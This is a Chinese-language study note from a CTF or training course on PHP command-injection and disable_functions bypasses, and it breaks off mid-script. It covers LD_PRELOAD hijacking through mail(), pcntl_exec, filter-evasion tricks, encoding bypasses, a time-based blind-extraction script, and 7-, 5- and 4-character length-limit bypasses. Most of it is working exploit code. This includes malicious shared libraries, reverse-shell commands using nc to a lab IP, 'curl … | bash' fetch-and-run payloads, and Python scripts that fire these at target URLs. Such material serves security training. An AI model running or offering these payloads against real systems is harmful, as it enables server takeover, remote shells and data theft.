+ 装入时动态链接：源程序编译侯所得到的一组目标模块，再装入内存时，边装入边链接

+ 运行时动态链接模块：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接

  对于动态链接来说，需要一个动态链接库，期作用在与当动态库中的函数发生变化对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新

### `LD_PRELOAD`

**修改库文件**

它可以影响程序的运行时的链接（Runtime linker），它运行你定义在程序原型前**优先加载的动态库链接**

这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数

通过这个环境变量，我们可以在主程序和其他动态链接库的中间**加载别的动态链接库**，甚至覆盖正常的函数库

使用自己的或是更好的函数（无需别人的源码）

*_也可以想别人的程序注入恶意程序_*

### 攻击流程

**以`mail()`函数举例**

#### 1. 正常执行文件

源文件

```php
<?php
mail('','','','');   
```

#### 2. 追踪文件的执行

`strace`工具用来检测`demo.php`在执行的过程中还做了哪些系统调用

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# strace -o 1.txt -f php demo.php
```

#### 3. 追踪可执行子进程

这里追踪到了一个`sendmail`子进程，

```shell
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# grep "exec" 1.txt                 
76377 execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5647b3b4fa38 /* 32 vars */ <unfinished ...>
76377 <... execve resumed>)             = 0

```

#### 4. 继续追踪子进程，寻找可利用函数

这里可以发现调用了函数`geteuid()`

```sh
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# readelf -Ws /usr/sbin/sendmail
99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (3)
```

#### 5. 编写脚本，重构`geteuid()`

使用C语言编写库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("echo 'Hacker~~'");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

`gcc`编译文件

```bash
gcc -shared -fPIC demo.c -o poc.so
```

修改PHP文件

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# cat demo.php 
<?php 
// 在程序运行之前先加载 LD_PRELOAD 的共享库
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 6. 总结

在执行程序之前，会预先将`LD_PRELOAD`的环境变量设置为`poc.so`，在`mail()`函数的执行过程中，会加载`geteuid()`，由于`getuid()`程序已经被恶意修改，所以达到了攻击的效果

```php
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

### 绕过条件

1. 能够上传自己的`.so`文件
2. 能够控制环境变量的值（设置`LD_PRELOAD`变量），比如`putenv()`函数并且未被禁止
3. 存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载`LD_PRELOAD`中的`.so`文件），比如`mail()、imal_mail()、mb_send_mail()和error_log()`



## 0x04. `mail()`函数命令执行例题

### 方法一

> 经典方法：但是也是最麻烦的方法

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("cat /flag > fl0g.txt");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

#### `gcc`编译

```bash
gcc -shared -fPIC demo.c -o poc.so
```

#### 生成PHP文件

```c
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 客户端访问测试

成功在当前路径中的`fl0g.txt`文件得到flag

### 方法二

> 最简单和最方便的方法，通过反弹shell得到命令执行权限

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid(){
    unsetenv("LD_PRELOAD");
    system("nc 192.168.231.129 7777 -e /bin/bash");
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo2.c -o demo2.so
```

#### 生成PHP文件

```php
<?php
putenv("LD_PRELOAD = ./demo2.so");
mail('','','','');
```

#### 客户端访问测试

成功会弹shell

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001110822.png" alt="image-20230814001110822" style="zoom:50%;" />

### 方法三

> 最复杂的方法，通过变量来指定要执行的命令

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid() {
    // 生成指针变量 cmdline，值是 环境变量EVIL_CMDLINE 中的值
    const char *cmdline = getenv("EVIL_CMDLINE");
    // 如果 LD_PRELOAD 为 NULL，则直接返回0，否则取消调用
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    // 执行命令
    system(cmdline);
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo1.c -o demo1.so
```

#### 生成PHP文件

```php
<?php
// 获取要执行的命令
$cmd = $_REQUEST['cmd'];
// 获取命令执行结果的输出路径
$out_path = $_REQUEST['out_path'];

// 拼接命令
// 2>&1 将 标准输出和错误输出 都输出出来
$evil_cmdline = $cmd. " > ".$out_path." 2>&1";
echo "<br/><b>cmdline：</b>".$evil_cmdline;
// 设置变量 EVIL_CMDLINE
putenv("EVIL_CMDLINE=".$evil_cmdline);

// 获取 so文件 的路径
$so_path = $_REQUEST['sopath'];
// 指定库文件
putenv("LD_PRELOAD=".$so_path);
mail('','','','');
echo "<br/><b>output：</b><br/>".file_get_contents($out_path);
```

#### 客户端测试

```
HTTP payload
?cmd=cat%20/flag&out_path=flag.txt&sopath=./demo1.so
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001725273.png" alt="image-20230814001725273" style="zoom:50%;" />

## 0x05. 蚁剑及`pcntl`绕过函数过滤

### 使用蚁剑插件绕过函数过滤

> Disable_function 插件的使用只能在Linux系统上运行

#### 1. Linux 蚁剑安装

```
Github 下载链接
https://github.com/AntSwordProject/AntSword-Loader
```

#### 2. 插件下载与安装

将插件下载之后解压缩到`antSword-master/antData/plugins`目录中即可

```
链接：https://pan.baidu.com/s/17DvmXiTV9gcTw8fbqurUaQ?pwd=xx66 
提取码：xx66
```

#### 3. 插件的使用

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160509828.png" alt="image-20230814160509828" style="zoom: 67%;" />



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160525394.png" alt="image-20230814160525394" style="zoom: 80%;" />

### `pcntl_exec`函数

#### 1. 函数的使用

```
pcntl_exec ( string `$path` [, array `$args` [, array `$envs` ]] ) : void
```

- `path`

  `path`必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的信息请查看您系统的execve（2）手册。

- `args`

  `args`是一个要传递给程序的参数的字符串数组。

- `envs`

  `envs`是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

##### 返回值

当发生错误时返回 **`FALSE`** ，没有错误时没有返回。

#### 2. 回弹`webshell`

##### 例题源码

```php
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02' . $dir);
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
```

##### payload

```
cmd=pcntl_exec("/bin/bash", array("-c", "nc 192.168.231.129 7777 -e /bin/bash"));
```

## 0x06. 命令拼接符

### `;`

使多个命令顺序执行

前面的命令和后面的命令都会执行

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami;id                                                                                     
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&`

是命令在后台运行

这样就可以同时执行多条命令

**若在前端提交，必须进行URL编码****

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&id
[1] 23116
pinginglab
[1]  + done       whoami
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&&`

如果前面的命令成功执行，则执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&&id
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)                                                                     
```

### `|`

管道符，将前面命令的标准输出做标准输入到后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo 'whoami' | /bin/bash 
pinginglab
```

### `||`

短路运算：前面的命令成功执行则不执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami || ls
pinginglab
```

## 0x07. 空格绕过

### 1. 大括号

使用大括号将命令拼接起来，并使用`,`分割

`{cat,flag.txt}`

### 2. `$IFS`代替空格

```
$IFS、${IFS}、$IFS$9
```

Linux 下有一个特殊的环境变量叫做IFS，叫做内部分隔符（internal field separator）

```
cat$IFS/flag
```

单纯`$IFS2`被`bash`解释器当作变量名，输不出结果，加一个`{}`就固定了变量名

```
cat${IFS}/flag
```

`$IFS$9` - 后面加个`$`与`{}`类似，起截断作用，$9是当前系统shell进程第9个参数持有者，始终为空字符

```bash
cat$IFS$9/flag
```

### 3. 重定向字符`<`,`<>`

`<`表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备

```bash
# 将 /flag.txt 标准输入到 cat 中
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat</flag.txt  
Flag is this
```

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat <>/flag.txt
Flag is this
```

### 4. URL编码

**%09(Tab)**

```bash
cat%09/flag
```

**%20(Tab)**

```
cat%20/flag
```

## 0x08. 文件名过滤绕过

### 1. 通配符绕过

使用通配符 `* | ?` 来绕过

其中，`*`代表所有，`?`代表一个字符

```bash
# 查看文件 /flag.txt
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f*                               
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f???????
Flag is this
```

### 2. 单引号、双引号绕过

Linux 中在命令中间插入单引号或双引号都可以继续执行命令

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl''ag.t""xt
Flag is this
```

### 3. 反斜杠绕过

Linux 中的反斜杠代表转义字符

```bash
# \a 在 Linux 中并没有特殊含义，所以依然当字母a来处理
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl\ag.txt 
Flag is this
```

### 4. 使用 `$1-9`，`$a,$*`等

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@ag.txt
Flag is this
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@*g.txt
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$5ag.txt
Flag is this
```

### 5. 内联执行

通过定义变量的方式来绕过安全过滤

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# a=/fl;b=ag;c=.t;d=xt;cat $a$b$c$d
Flag is this
```

### 6. 利用 Linux 中的环境变量

通过对 Linux 中的环境变量进行字符切片从而拼接成所需要的字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo $PATH                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo f${PATH:5:1}${PATH:8:1}g 
flag
```

## 0x09. 常见文件读取命令绕过

### 1. `tac`：方向显示

将文件以行为单位反向显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tac php-exec/demo.php 
mail('','','','');
putenv("LD_PRELOAD=./poc.so");
<?php
```

### 2. `more`：一页一页的显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# more /flag.txt
```

### 3. `less`：与`more`类似

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# less /flag.txt
```

### 4. `tail`：查看末尾几行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tail /flag.txt       
Flag is this
```

### 5. `nl`：显示的时候，顺便输出行号

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nl /flag.txt 
     1  Flag is this
```

### 6. `od`：以二进制的方式读取档案内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# od /flag.txt 
0000000 066106 063541 064440 020163 064164 071551 000012
0000015
```

### 7. `xxd`：读取二进制文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# xxd /flag.txt 
00000000: 466c 6167 2069 7320 7468 6973 0a         Flag is this.
```

### 8. `sort`：主要用于排序文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# sort /flag.txt               
Flag is this
```

### 9. `uniq`：包裹或删除文件中重复的行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# uniq /flag.txt 
Flag is this
```

### 10. `file -f`：报错出具体内容

文件中以行为单位打开文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# file -f /flag.txt 
Flag is this: cannot open `Flag is this' (No such file or directory)
```

### 11. `grep`：在文本中过滤出所需字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# grep "f*" /f*                        
Flag is this	
```

## 0x10. 编码绕过

### 0. 例题代码

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match("/flag|php|cat|sort|shell/i", $cmd)) {
        eval($cmd);
    }
    else{
        echo "再来黑我丫！！！";
    }
}
```

### 1. `base64`编码绕过

**反引号的作用**

Linux 中的反引号的作用：将反引号中的命令输出，作为另一个命令的参数

```bash
# 通过 echo 输出文件名作为 cat 命令的参数
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat `echo /flag.txt`                  
Flag is this
```

反引号的使用一定需要搭配`echo`来执行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo Y2F0IC9mbGFnLnR4dAo= |base64 -d` 
Flag is this

# 也可以通过重定向到 /bin/bash 来执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "Y2F0IC9mbGFnLnR4dAo=" |base64 -d | /bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo Y2F0IC9mbGFnLnR4dAo= |base64 -d)        
Flag is this
```

### 2. `base32`编码绕过

与`base64`编码绕过一样，只不过将算法换成了`base32`

```bash
# 反引号执行
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d`
Flag is this

# 管道重定向到新的 shell
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d |/bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d)        
Flag is this
```

### 3. `HEX`编码绕过

```bash
# 使用 Linux 对字符串做 HEX 运算
# -ps 以纯文本16进制的形式输出
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "cat /flag.txt" |xxd -ps                      
636174202f666c61672e7478740a

# 使用 编码转换 的方式执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "636174202f666c61672e7478740a" |xxd -r -p |/bin/bash
Flag is this
```

### 4. `shellcode`编码

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74" |/bin/bash
Flag is this
```

### 5. 编码转换脚本

```python
import binascii

# 要转换的字符串
string = "cat /flag.txt"

hex_string = binascii.hexlify(string.encode()).decode()
print('HEX 编码：', hex_string)

res = ''
for i in range(0, len(hex_string), 2):
    res += '\\x' + hex_string[i] + hex_string[i + 1]

print("shell code编码：", res)
```

## 0x10. 无回显盲注

### 例题代码

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\!|\@|\#|\%|\^|\&|\*|\?|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['cmd'])){
    $cmd=$_GET['cmd'];
    check($cmd);
    exec($cmd);
}
else{
    highlight_file(__FILE__);
}
?>
```

### 前置知识

#### 1. `awk NR==N`：查询指定行

```bash
# awk NR==2：指定查询第二行的内容
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat -n base.txt| awk NR==2 
     2  is
```

#### 2. `cut -c`：查询指定列的字符

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| cut -c 1 
f
i
t
h
h
h
```

#### 3. 组合查询指定行的第N个字符

```bash
# 查询第一行的第一个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==1 |cut -c 1
f

# 查询第二行的第二个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==2 |cut -c 2
s
```

#### 4. `IF`语句

由于在Linux中，`<`，`>`字符被用于重定向，所以需要用其他字符来代替

```
-gt（大于）、-lt（小于）、-ge（大于等于）和 -le（小于等于）
```

```bash
# 格式
if [ 条件表达式 ];then True分支;fi

# 3>2，指定命令
# 注意在 [] 中，所有字符都需要有一个空格隔开
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ 3 -gt 2 ];then echo 'yes';fi
yes
```

#### 5. `sleep`：睡眠

```bash
# 睡眠3秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ sleep 3  
```

#### 6. 组合使用

```bash
# 如果文件中的第一个字符为f就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt| awk NR==1| cut -c 1) == 'f' ];then sleep 2;fi

# 如果文件中的第三行第一个字符是 t 就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt |awk NR==3| cut -c 1) == 't' ];then sleep 2;fi
```

### Python盲注脚本

```py
# 我写的
import requests
import time

base_url = "http://192.168.231.129:18080/class08/1.php?cmd="

# if [ $(cat base.txt| awk NR==2 |cut -c 2) == s ];then echo "yes";fi
res = ''
# 多少行
for row in range(1, 10):
    # 多少字符
    for cut_char in range(1, 50):
        # ASCII 码爆破范围
        for ascii_char in range(32, 128):
            # time.sleep(0.5)
            char = chr(ascii_char)
            # payload = f"if [ `cat /flag |awk NR=={row} | cut -c {cut_char}` == {char} ];then sleep 2;fi"
            payload = f"if [ `cat flag.php | awk NR=={row} | cut -c {cut_char}` == {ascii_char} ];then sleep 2;fi"
            url = base_url + payload
            # print(url)
            try:
                print("发送：", end='')
                req = requests.get(url, timeout=1).text
                print(req)
            except Exception as e:
                print("获得字符：",char)
                res += char
                break
print(res)

# 课程给的
import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #ascii鐮佽〃
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

## 0x11. 长度绕过前置知识

### 1. 命令换行执行

```bash
# \ 可以使命令换行执行
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ca\ 
> t\            
>  flag
ctuctf={awsduhwiquhduiqwbfiu}
```

### 2. `ls -t`：按时间排序显示

将文件名按时间排序来显示，**从最近--->最远**，单位为秒

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t    
 x  'cat \'  'fla\'   g   flag
```

### 3. `>`创建文件

可以使用重定向输出创建文件

```bash
# 一般用法
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# echo "ctuctf={awsduhwiquhduiqwbfiu}" > flag 

# 也可以直接当 touch 使用
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
```

### 4. 执行文件

#### `sh`：执行命令

**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取

```shell
bash [options] [file]
```

**sh命令** 执行命令**不需要文件有执行权限**，推荐使用这种方法

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

#### `./filename`：执行命令

要求文件有执行权限

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ./x
./x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
./x: 5: flag: not found
```

### 5. 组合使用

#### 思路

1. 利用`>`来创建文件，减少命令长度
2. 利用`\`来切割命令
3. `ls -t`，按时间将文件名来排序，最后使用`>`写入执行文件

#### 实战流程

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >g    
^C
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >cat\ \\
^C                                                                                                                                                                                                                                                
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t > x
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

### `dir`命令

`dir`会在`ls -t`的基础上做不换行输出

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir                                   
cat\ \\  fla\\  flag  g  x
                                                                                                                                                                                   
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir > z
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# cat z
cat\ \\  fla\\  flag  g  x  z
```

**`$(dir*)`**会将两个文件名拼接成一条命令，其中第一个文件名为命令，第二个文件名为参数

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir    
cat  flag

┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# $(dir *)                                   
ctuctf={awsduhwiquhduiqwbfiu}
```

### `rev`反向输出文件内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# rev flag                               
}uifbwqiudhuqiwhudswa{=ftcutc
```

## 0x12. 长度为7限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!!";
}
```



利用前置知识，将命做为文件名分为多断写入，最后使用命令`ls -t>y`，写入文件，使用`sh y`执行命令

注意：由于`ls -t`会以时间由近及远的方式写入，所以需要将命令倒着写入

### POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/class09/2/index.php?cmd='

if __name__ == '__main__':
    # 要执行命令：
    # cat flag|nc 192.168.231.129 7777
    # ls -t>a
    # sh a
    payload_list = ['>7777', '>29\ \\\\', '>1.1\\\\', '>23\\\\', '>68.\\\\', '>2.1\\\\', '>19\\\\',
                    '>nc\ \\\\', '>g\|\\\\', '>fla\\\\', '>t\ \\\\', '>ca\\\\', 'ls -t>a', 'sh a']
    rst = ''
    for i in payload_list:
        rst += ' ' + i
        print("发送：", rst)
        res = requests.get(base_url + i).text
        # print(res)
```

## 0x13. 长度为5限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```



在`0x12`的基础上改进：

1. `ls -t>y`超过了5个字符，所以这种方法不可取；延申长度为7的绕过思路，使用`ls>y`命令，将`ls -t>y`的命令截断写入文件，最后执行

   1. 这里有一个窍门，因为`ls`排序的问题，所以我们需要先将`ls\\`写入文件中

   2. 写入顺序如下：

   3. ```bash
      # 先将 ls\ 创建出来并写入，后续追加就能得到想要的效果
      >ls\\
      ls>_
      >\ \\
      >-t\\
      >\>y
      ls>>_
      
      root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/3# cat _
      _
      backup
      flag
      index.php
      # 这里组成了一段完整的命令
      # ---------------
      ls\
       \
      -t\
      >y
      _
      # ---------------
      backup
      flag
      index.php
      ls
      ```

### POC代码

由于需要通过`curl`的方式来执行`nc`以获取`webshell`，所以这里需要先开启Web服务

```bash
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/3/index.php?cmd='

if __name__ == '__main__':
    # 写入命令1：ls -t>x
    payload_list1 = ['>ls\\\\', 'ls>_', '>\\ \\\\', '>-t\\\\', '>\\>y', 'ls>>_']
    # 写入命令2：curl 192.168.231.129|bash
    payload_list2 = [">bash", ">\\|\\\\", ">29\\\\", ">1\\\\", ">1.\\\\", ">23\\\\", ">8.\\", ">16\\", ">2.\\", ">19\\", ">\ \\",">rl\\", ">cu\\"]

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh _")
    requests.get(base_url + "sh y")
```

## 0x14. 长度为4限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    str_replace("/\?|/","=====",$argv);
    return $argv;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```

### 思路分析

由于长度的限制为4，所以`ls>>a`超过了规定长度，无法构造出所需命令`ls -t`

可以使用**`*`**进行绕过，作用相等于`$(dir)`，将第一个文件名当作命令，后续的文件名当作参数

```bash
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ ls             
cat  flag
       
# 执行了命令：cat flag
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ *
hahaha
```

### payload 构造分析

**构造思路：**利用`* = $(dir)`的特点，执行`dir`命令，为了保证字符的顺序，这里使用倒序，最后使用命令`rev`进行排序

```bash
# 先构造一个 ; 来截断命令，防止后面有其他字符干扰命令执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\;
# 倒序构造命令
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\>
# 由于 t 的排序靠后，无法组成完整顺序，所以这里使用 h 把排序往前拉
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >ht-
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >sl
# 创建文件 dir，以便使用 * 执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >dir
# 这里等于 dir>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat v
ffff.php  flag  g;  g>  ht-  sl

zackup:
ffff.php  flag

# 创建文件 rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# ls
 dir   ffff.php   flag  'g;'  'g>'   ht-   rev   sl   v   zackup
# 这里等于 rev v>x
# 这里之所以能匹配到 rev 而不是 div，可能是因为命令是：*v>x，而不是：*>x，因为 div 不需要参数
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *v>x
# 成功构造出 ls -th g
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat x
ls  -th >g  ;g  galf  php.ffff

:pukcaz
galf  php.ffff

# 最后使用同样的方法构造出命令：curl 0xC0A8E781|bash
```

### POC代码

```py
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/4/ffff.php?cmd='

if __name__ == '__main__':
    # 文件 v 用于存储 dir 输出的内容
    # 文件 x 用于将文件 v 的内容进行倒序
    # 写入命令1：ls -t>x
    payload_list1 = ['>g\;', '>g\>', '>ht-', '>sl', '>dir', '*>v', '>rev', '*v>x']
    # 写入命令2：curl 192.168.231.129|bash
    payload_list2 = [">ash", ">b\\", '>\|\\', '>81\\', '>E7\\', '>A8\\', '>C0\\', '>0x\\', '>\ \\', '>rl\\', '>cu\\']

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
